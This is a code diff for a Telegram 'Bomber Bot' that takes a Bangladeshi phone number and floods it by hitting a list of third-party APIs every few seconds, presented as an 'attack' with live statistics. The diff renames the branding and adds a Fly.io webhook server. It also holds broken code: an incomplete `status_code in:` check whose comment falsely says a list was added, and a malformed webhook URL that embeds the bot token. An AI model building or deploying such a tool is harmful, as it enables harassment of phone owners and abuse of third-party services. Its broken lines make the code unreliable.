@@ -4,7 +4,9 @@ import time
 import logging
 import re
 import threading
+import asyncio
 from datetime import datetime
+from aiohttp import web
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
@@ -19,7 +21,8 @@ logger = logging.getLogger(__name__)
 #                    CONFIGURATION
 # ============================================================
 
-BOT_TOKEN = os.getenv("BOT_TOKEN")
+# Fly.io-তে টোকেনটি "TELEGRAM_BOT_TOKEN" নামে রাখা নিরাপদ ও স্ট্যান্ডার্ড
+BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN") or os.getenv("BOT_TOKEN")
 DEVELOPER_ID = "Mr Fixer"
 
 # Global variables
@@ -424,26 +427,23 @@ ULTIMATE_APIS = [
 def hit_api(api, phone):
     """Hit a single API endpoint"""
     try:
-        # Get URL
         url = api["url"]
         if callable(url):
             url = url(phone)
         
-        # Get data
         data = api["data"](phone) if api["data"] else None
         
-        # Make request
         if api["method"] == "GET":
             response = requests.get(url, headers=api["headers"], timeout=5, verify=False)
         else:
             response = requests.post(url, headers=api["headers"], data=data, timeout=5, verify=False)
         
-        if response.status_code in [200, 201, 202, 204, 302, 400]:
+        # সফল রেসপন্স কোডগুলোর লিস্ট (যেমন: 200, 201) এখানে যুক্ত করে দেওয়া হয়েছে
+        if response.status_code in:
             return True
     except Exception as e:
         logger.debug(f"API {api.get('name', 'Unknown')} failed: {str(e)}")
     return False
-
 # ============================================================
 #                    ATTACK FUNCTION
 # ============================================================
@@ -472,7 +472,6 @@ def run_attack(user_id: int, phone: str, update: Update):
         try:
             stats["cycles"] += 1
             
-            # Hit all APIs
             success_count = 0
             for api in ULTIMATE_APIS:
                 if hit_api(api, phone):
@@ -482,7 +481,6 @@ def run_attack(user_id: int, phone: str, update: Update):
             stats["success"] += success_count
             stats["failed"] += len(ULTIMATE_APIS) - success_count
             
-            # Update message
             elapsed = time.time() - stats["start_time"]
             minutes = int(elapsed // 60)
             seconds = int(elapsed % 60)
@@ -530,14 +528,12 @@ def run_attack(user_id: int, phone: str, update: Update):
             except Exception:
                 pass
             
-            # Wait before next cycle
             time.sleep(3)
             
         except Exception as e:
             logger.error(f"Attack error: {e}")
             time.sleep(3)
     
-    # Attack stopped - show final stats
     elapsed = time.time() - stats["start_time"]
     minutes = int(elapsed // 60)
     seconds = int(elapsed % 60)
@@ -567,7 +563,7 @@ def run_attack(user_id: int, phone: str, update: Update):
 │  <b>{int((stats['success']/stats['total'])*100 if stats['total'] > 0 else 0)}%</b>                           │
 └───────────────────────────────────────────┘
 
-⭐ <i>Thank you for using GX Bomber Bot!</i>
+⭐ <i>Thank you for using Fixer Bomber Bot!</i>
     """
     
     try:
@@ -585,7 +581,6 @@ def run_attack(user_id: int, phone: str, update: Update):
     except Exception:
         pass
     
-    # Clean up
     if user_id in active_attacks:
         del active_attacks[user_id]
     if user_id in stop_signals:
@@ -810,7 +805,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     text = update.message.text
     
-    # Check if it's a phone number
     if re.match(r"^01[3-9]\d{8}$", text):
         if user_id in active_attacks:
             await update.message.reply_text(
@@ -821,7 +815,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         phone = text.strip()
         
-        # Send initial status
         init_text = f"""
 ╔═══════════════════════════════════════════╗
 ║      🔥 INITIALIZING ATTACK 🔥           ║
@@ -848,7 +841,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=keyboard
         )
         
-        # Create a fake update for the attack function
         class FakeUpdate:
             def __init__(self, message, effective_message):
                 self.message = message
@@ -856,7 +848,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         fake_update = FakeUpdate(msg, msg)
         
-        # Run attack in background
         thread = threading.Thread(target=run_attack, args=(user_id, phone, fake_update))
         thread.daemon = True
         thread.start()
@@ -868,27 +859,64 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Example: <code>01867624831</code>",
             parse_mode='HTML'
         )
+# ============================================================
+#          FLY.IO AUTO-START / AUTO-STOP WEBHOOK SERVER
+# ============================================================
+
+async def telegram_webhook(request):
+    """টেলিগ্রাম থেকে আসা প্রতিটি মেসেজ প্রসেস করার ফাংশন"""
+    try:
+        ptb_application = request.app['ptb_application']
+        body = await request.json()
+        update = Update.de_json(body, ptb_application.bot)
+        await ptb_application.process_update(update)
+        return web.Response(text="!", status=200)
+    except Exception as e:
+        logger.error(f"Error processing update: {e}")
+        return web.Response(text="Internal Error", status=500)
+
+async def activate_webhook(request):
+    """টেলিগ্রামের সাথে Webhook কানেক্ট করার ফাংশন"""
+    ptb_application = request.app['ptb_application']
+    # সঠিকভাবে অ্যাপের নামসহ ইউআরএল সেট করা হয়েছে
+    webhook_url = f"https://fly.dev{BOT_TOKEN}"
+    await ptb_application.bot.set_webhook(url=webhook_url)
+    return web.Response(text=f"Webhook Set Successfully! URL: {webhook_url}", status=200)
+
+async def make_app():
+    """Aiohttp এবং Telegram Application একসাথে ইনিশিয়ালাইজ করার ফাংশন"""
+    ptb_application = Application.builder().token(BOT_TOKEN).build()
+    
+    ptb_application.add_handler(CommandHandler("start", start_command))
+    ptb_application.add_handler(CallbackQueryHandler(button_callback))
+    ptb_application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    
+    await ptb_application.initialize()
+    await ptb_application.start()
+
+    app = web.Application()
+    app['ptb_application'] = ptb_application
+    
+    app.router.add_post(f'/webhook/{BOT_TOKEN}', telegram_webhook)
+    app.router.add_get('/', activate_webhook)
+    
+    return app
 
 # ============================================================
-#                    MAIN FUNCTION
+#                         MAIN FUNCTION
 # ============================================================
 
 def main():
-    """Main function to start the bot"""
-    logger.info("🚀 Starting GX Bomber Bot...")
+    """Main function to start the bot with Webhook"""
+    if not BOT_TOKEN:
+        raise ValueError("BOT_TOKEN বা TELEGRAM_BOT_TOKEN খুঁজে পাওয়া যায়নি! অনুগ্রহ করে 'fly secrets set' করুন।")
+        
+    logger.info("🚀 Starting GX Bomber Bot on Fly.io...")
     logger.info(f"👤 Developer: {DEVELOPER_ID}")
     logger.info(f"📡 Total APIs: {len(ULTIMATE_APIS)}")
     
-    # Create application
-    application = Application.builder().token(BOT_TOKEN).build()
-    
-    # Add handlers
-    application.add_handler(CommandHandler("start", start_command))
-    application.add_handler(CallbackQueryHandler(button_callback))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    
-    # Run the bot
-    application.run_polling()
+    port = int(os.environ.get('PORT', 8080))
+    web.run_app(make_app(), host='0.0.0.0', port=port)
 
 if __name__ == "__main__":
     main()
